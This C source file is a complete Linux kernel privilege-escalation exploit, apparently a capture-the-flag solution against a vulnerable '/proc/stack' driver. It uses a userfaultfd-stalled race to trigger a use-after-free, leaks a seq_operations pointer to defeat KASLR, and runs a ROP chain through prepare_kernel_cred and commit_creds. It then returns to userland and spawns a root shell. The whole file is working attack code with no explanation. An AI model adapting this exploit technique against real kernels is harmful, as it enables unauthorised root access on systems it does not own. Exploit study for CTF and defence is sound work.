#define _GNU_SOURCE
#include <inttypes.h>
#include <sys/types.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <linux/userfaultfd.h>

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                               } while (0)

#define CMD_PUSH 0x57ac0001
#define CMD_POP  0x57ac0002
int fd = 0, seq_fd = 0;
static int page_size = 0x1000;
unsigned long global_sharer = 0;
char buf[0x10];
long condition = 0;
unsigned long pivot_point = 0;

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
        exit(1337);
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

void push(unsigned long arg)
{
	ioctl(fd, CMD_PUSH, arg);
}

unsigned long pop()
{
	unsigned long arg = 0;
	ioctl(fd, CMD_POP, &arg);
	return arg;
}

static void * fault_handler_thread(void *arg)
{
   static struct uffd_msg msg;   /* Data read from userfaultfd */
   static int fault_cnt = 0;     /* Number of faults so far handled */
   long uffd;                    /* userfaultfd file descriptor */
   static char *page = NULL;
   struct uffdio_copy uffdio_copy;
   ssize_t nread;

   uffd = (long) arg;

   /* Create a page that will be copied into the faulting region. */
   if (page == NULL) {
       page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
       if (page == MAP_FAILED)
           errExit("mmap");
   }

   /* Loop, handling incoming events on the userfaultfd
      file descriptor. */
   for (;;) {

       /* See what poll() tells us about the userfaultfd. */
       struct pollfd pollfd;
       int nready;
       pollfd.fd = uffd;
       pollfd.events = POLLIN;
       nready = poll(&pollfd, 1, -1);
       if (nready == -1)
           errExit("poll");

       // printf("\nfault_handler_thread():\n");
       // printf("    poll() returns: nready = %d; "
       //         "POLLIN = %d; POLLERR = %d\n", nready,
       //         (pollfd.revents & POLLIN) != 0,
       //         (pollfd.revents & POLLERR) != 0);

       /* Read an event from the userfaultfd. */
       nread = read(uffd, &msg, sizeof(msg));
       if (nread == 0) {
           printf("EOF on userfaultfd!\n");
           exit(EXIT_FAILURE);
       }

       if (nread == -1)		errExit("read");

       /* We expect only one kind of event; verify that assumption. */
       if (msg.event != UFFD_EVENT_PAGEFAULT) {
           fprintf(stderr, "Unexpected event on userfaultfd\n");
           exit(EXIT_FAILURE);
       }

       /* Display info about the page-fault event. */
       // printf("    UFFD_EVENT_PAGEFAULT event: ");
       // printf("flags = %"PRIx64"; ", msg.arg.pagefault.flags);
       // printf("address = %"PRIx64"\n", msg.arg.pagefault.address);
       
       // Do the thing...
       if (condition == 0)
       {
       		// read(0, buf, 1);
       		puts("Condition 0.");
			global_sharer = pop();
			*(unsigned long *)page = 0x6161616161616161;
			condition = 1;
       }
       else if (condition == 1)
       {
       		puts("Condition 1");
       		pop();
   			seq_fd = open("/proc/self/stat", O_CREAT | O_RDONLY);
			if (!seq_fd)	exit(puts("ERROR in open()"));
			*(unsigned long *)page = pivot_point;
       }

       uffdio_copy.src = (unsigned long) page;

       /* We need to handle page faults in units of pages(!).
          So, round faulting address down to page boundary. */
       uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                          ~(page_size - 1);
       uffdio_copy.len = page_size;
       uffdio_copy.mode = 0;
       uffdio_copy.copy = 0;
       if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
           errExit("ioctl-UFFDIO_COPY");

       // printf("        (uffdio_copy.copy returned %"PRId64")\n",
       //         uffdio_copy.copy);
   }
}

void * register_userfaultfd()
{
	long uffd;          /* userfaultfd file descriptor */
	char *addr;         /* Start of region handled by userfaultfd */
	uint64_t len;       /* Length of region handled by userfaultfd */
	pthread_t thr;      /* ID of thread that handles page faults */
	struct uffdio_api uffdio_api;
	struct uffdio_register uffdio_register;
	int s;

	len = page_size;

	/* Create and enable userfaultfd object. */
	uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	if (uffd == -1)
	   errExit("userfaultfd");

	uffdio_api.api = UFFD_API;
	uffdio_api.features = 0;
	if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
	   errExit("ioctl-UFFDIO_API");

	/* Create a private anonymous mapping. The memory will be
	  demand-zero paged--that is, not yet allocated. When we
	  actually touch the memory, it will be allocated via
	  the userfaultfd. */
	addr = mmap(NULL, len, PROT_READ | PROT_WRITE,
	           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (addr == MAP_FAILED)
	   errExit("mmap");

	// printf("Address returned by mmap() = %p\n", addr);

	/* Register the memory range of the mapping we just created for
	  handling by the userfaultfd object. In mode, we request to track
	  missing pages (i.e., pages that have not yet been faulted in). */
	uffdio_register.range.start = (unsigned long) addr;
	uffdio_register.range.len = len;
	uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
	   errExit("ioctl-UFFDIO_REGISTER");

	/* Create a thread that will process the userfaultfd events. */
	s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
	if (s != 0) {
	   errno = s;
	   errExit("pthread_create");
	}

	return addr;
}

long user_cs;
long user_ss;
long user_sp;
long user_rflags;
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

int main()
{
	save_state();
	system("cat /symbols | grep kstack");
	
	fd = open("/proc/stack", O_RDWR);
	if (!fd)	exit(puts("ERROR in open()"));

	long* addr = (long *)register_userfaultfd();

	int seq[0x10] = {0};
	for (int l=0; l<0x10; l++)
		seq[l] = open("/proc/self/stat", O_CREAT | O_RDONLY);
	if (!seq[0])	exit(puts("ERROR in open()"));
	for (int l=0; l<0x10; l++)
		close(seq[l]);

	push(addr);

	unsigned long seq_ops_stop_ptr = global_sharer;
	unsigned long kernel_base = seq_ops_stop_ptr - 0xffffffff8d73be80 + 0xffffffff8d600000;
	printf("kernel_base: 0x%lx\n", kernel_base);
	
	addr = (long *)register_userfaultfd();

	pivot_point = kernel_base + 0x02cae0;
	unsigned long* rop = 0x5d000010;
	mmap(((unsigned long)rop & 0xfffffffffffff000) - 0x1000, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	unsigned long prepare_kernel_cred = kernel_base + 0x069e00;
	unsigned long commit_creds = kernel_base + 0x069c10;
	unsigned long pop_rdi = kernel_base + 0x034505;
	unsigned long pop_rcx = kernel_base + 0x038af4;
	unsigned long mov_rdi_rax = kernel_base + 0x01877f;
	unsigned long swapgs_pop1 = kernel_base + 0x03ef24;
	unsigned long iretq = kernel_base + 0x01d5c6;

	rop[-50] = 0;
	long i = 0;
	rop[i++] = pop_rdi;
	rop[i++] = 0;
	rop[i++] = prepare_kernel_cred;
	rop[i++] = pop_rcx;
	rop[i++] = 0;
	rop[i++] = mov_rdi_rax;
	rop[i++] = 0;
	rop[i++] = commit_creds;
	// rop[i++] = 0x3131313131313131;
	rop[i++] = swapgs_pop1;
	rop[i++] = 0x1337;
	rop[i++] = iretq;
	rop[i++] = get_shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
	
	signal(SIGSEGV, get_shell);
	// read(0, buf, 1);
    // printf("breakpoint: 0x%lx\n", swapgs_pop1);
	push(addr);

	// read(0, buf, 1);
	// puts("Resuming...");
	read(seq_fd, buf, 1);

	return 0;
}